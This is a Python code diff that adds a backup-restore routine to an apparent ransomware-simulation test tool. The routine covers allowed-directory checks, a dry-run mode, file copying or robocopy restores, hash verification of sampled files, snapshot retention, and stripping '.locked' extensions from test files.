+        - restore_mode: "in_place" or "restore_to_new_folder"
+        - target_override_path: Target path for restore_to_new_folder
+        - dry_run: If True, simulate without making changes
+        """
+        job_id = parameters.get("job_id")
+        snapshot_id = parameters.get("snapshot_id")
+        snapshot_path = parameters.get("snapshot_path")
+        source_paths = parameters.get("source_paths", [])
+        restore_mode = parameters.get("restore_mode", "in_place")
+        target_override = parameters.get("target_override_path")
+        dry_run = parameters.get("dry_run", False)
+        
+        self.logger.info(f"[RESTORE] ===== BACKUP RESTORE =====")
+        self.logger.info(f"[RESTORE] Snapshot: {snapshot_path}, Mode: {restore_mode}, DryRun: {dry_run}")
+        
+        result = {
+            "success": False,
+            "job_id": job_id,
+            "snapshot_id": snapshot_id,
+            "dry_run": dry_run,
+            "restore_mode": restore_mode,
+            "files_restored": 0,
+            "files_failed": 0,
+            "bytes_restored": 0,
+            "restored_paths": [],
+            "verification_passed": False,
+            "verification_sample": [],
+            "errors": [],
+            "commands": [],
+            "stdout": "",
+            "stderr": ""
+        }
+        
+        # Validate snapshot exists
+        snapshot_dir = Path(snapshot_path)
+        if not snapshot_dir.exists():
+            result["errors"].append(f"Snapshot path does not exist: {snapshot_path}")
+            return (False, json.dumps(result))
+        
+        # Validate restore target is in allowed directories
+        allowed_prefixes = [
+            r"C:\RansomTest",
+            r"C:\target_data",
+            r"C:\ProgramData\RansomRun",
+            r"C:\RestoreTest"
+        ]
+        
+        if restore_mode == "restore_to_new_folder" and target_override:
+            target_upper = target_override.upper()
+            if not any(target_upper.startswith(prefix.upper()) for prefix in allowed_prefixes):
+                result["errors"].append(f"Restore target '{target_override}' not in allowed directories")
+                return (False, json.dumps(result))
+        
+        if dry_run:
+            self.logger.info(f"[RESTORE] DRY RUN - Would restore from: {snapshot_path}")
+            # Count what would be restored
+            for f in snapshot_dir.rglob("*"):
+                if f.is_file() and f.name not in ["manifest.json", "sha256_manifest.txt"]:
+                    result["files_restored"] += 1
+                    result["bytes_restored"] += f.stat().st_size
+            result["success"] = True
+            result["message"] = f"Dry run: would restore {result['files_restored']} files"
+            return (True, json.dumps(result))
+        
+        try:
+            # Load manifest if available
+            manifest_path = snapshot_dir / "manifest.json"
+            manifest = {}
+            if manifest_path.exists():
+                manifest = json.loads(manifest_path.read_text())
+            
+            # Determine restore targets
+            # Snapshot structure: snapshot_dir/RansomTest/target_data/...
+            # Original path: C:\RansomTest\target_data\...
+            
+            for entry in snapshot_dir.iterdir():
+                if entry.name in ["manifest.json", "sha256_manifest.txt"]:
+                    continue
+                
+                if entry.is_dir():
+                    # Reconstruct original path
+                    # Entry name might be like "RansomTest" (without C:)
+                    if restore_mode == "in_place":
+                        # Restore to original location
+                        original_drive = "C:"
+                        dest_path = Path(original_drive) / entry.name
+                        
+                        # Walk through the snapshot directory structure
+                        for sub_entry in entry.rglob("*"):
+                            if sub_entry.is_file():
+                                rel_path = sub_entry.relative_to(entry)
+                                final_dest = dest_path / rel_path
+                                
+                                try:
+                                    final_dest.parent.mkdir(parents=True, exist_ok=True)
+                                    import shutil
+                                    shutil.copy2(str(sub_entry), str(final_dest))
+                                    result["files_restored"] += 1
+                                    result["bytes_restored"] += sub_entry.stat().st_size
+                                    result["restored_paths"].append(str(final_dest))
+                                except Exception as e:
+                                    result["files_failed"] += 1
+                                    result["errors"].append(f"Failed to restore {sub_entry}: {e}")
+                    else:
+                        # Restore to new folder
+                        dest_base = Path(target_override) if target_override else Path(r"C:\RestoreTest")
+                        dest_base.mkdir(parents=True, exist_ok=True)
+                        
+                        # Use robocopy for directory restore
+                        robocopy_cmd = [
+                            "robocopy",
+                            str(entry),
+                            str(dest_base / entry.name),
+                            "/E",        # Copy subdirectories including empty
+                            "/R:1",
+                            "/W:1",
+                            "/COPY:DAT",
+                            "/DCOPY:DAT",
+                            "/NP", "/NDL", "/NFL"
+                        ]
+                        
+                        proc = subprocess.run(
+                            robocopy_cmd,
+                            capture_output=True,
+                            text=True,
+                            timeout=300
+                        )
+                        
+                        result["commands"].append({
+                            "cmd": " ".join(robocopy_cmd),
+                            "exit_code": proc.returncode
+                        })
+                        result["stdout"] += proc.stdout + "\n"
+                        result["stderr"] += proc.stderr + "\n"
+                        
+                        # Count restored files
+                        for f in (dest_base / entry.name).rglob("*"):
+                            if f.is_file():
+                                result["files_restored"] += 1
+                                result["bytes_restored"] += f.stat().st_size
+                                result["restored_paths"].append(str(f))
+            
+            # Verify a sample of restored files
+            if result["files_restored"] > 0:
+                hash_manifest_path = snapshot_dir / "sha256_manifest.txt"
+                if hash_manifest_path.exists():
+                    hash_lines = hash_manifest_path.read_text().strip().split("\n")
+                    sample_size = min(10, len(hash_lines))
+                    import random
+                    sample = random.sample(hash_lines, sample_size) if len(hash_lines) >= sample_size else hash_lines
+                    
+                    verified = 0
+                    for line in sample:
+                        if "  " in line:
+                            expected_hash, rel_path = line.split("  ", 1)
+                            # Find the restored file
+                            if restore_mode == "in_place":
+                                restored_file = Path("C:") / rel_path
+                            else:
+                                dest_base = Path(target_override) if target_override else Path(r"C:\RestoreTest")
+                                restored_file = dest_base / rel_path
+                            
+                            if restored_file.exists():
+                                actual_hash = self._calculate_file_hash(restored_file)
+                                match = actual_hash == expected_hash
+                                result["verification_sample"].append({
+                                    "path": str(restored_file),
+                                    "expected": expected_hash[:16] + "...",
+                                    "actual": actual_hash[:16] + "...",
+                                    "match": match
+                                })
+                                if match:
+                                    verified += 1
+                    
+                    result["verification_passed"] = verified == len(sample)
+            
+            result["success"] = result["files_restored"] > 0 and result["files_failed"] == 0
+            self.logger.info(f"[RESTORE] Completed: {result['files_restored']} files restored")
+            
+        except Exception as e:
+            self.logger.exception(f"[RESTORE] Error: {e}")
+            result["errors"].append(str(e))
+        
+        return (result["success"], json.dumps(result))
+    
+    def _calculate_file_hash(self, file_path: Path, algorithm: str = "sha256") -> str:
+        """Calculate hash of a file."""
+        import hashlib
+        
+        hash_func = hashlib.new(algorithm)
+        try:
+            with open(file_path, "rb") as f:
+                for chunk in iter(lambda: f.read(8192), b""):
+                    hash_func.update(chunk)
+            return hash_func.hexdigest()
+        except Exception:
+            return ""
+    
+    def _enforce_backup_retention(self, plan_dir: Path, keep_count: int):
+        """Delete old snapshots beyond retention count."""
+        if not plan_dir.exists():
+            return
+        
+        # Get all snapshot directories sorted by name (timestamp)
+        snapshots = sorted(
+            [d for d in plan_dir.iterdir() if d.is_dir()],
+            key=lambda x: x.name,
+            reverse=True  # Newest first
+        )
+        
+        # Delete old snapshots
+        for old_snapshot in snapshots[keep_count:]:
+            try:
+                import shutil
+                shutil.rmtree(old_snapshot)
+                self.logger.info(f"[BACKUP] Deleted old snapshot: {old_snapshot}")
+            except Exception as e:
+                self.logger.warning(f"[BACKUP] Failed to delete old snapshot {old_snapshot}: {e}")
 
 
 # =============================================================================
@@ -2146,8 +5821,7 @@ def restore_files():
         restored = 0
         for filepath in test_path.iterdir():
             if filepath.suffix == ".locked":
-                # Remove .locked extension
-                new_name = filepath.stem  # This removes .locked
+                new_name = filepath.stem
                 new_path = filepath.with_name(new_name)
                 filepath.rename(new_path)
                 print(f"Restored: {filepath.name} -> {new_path.name}")
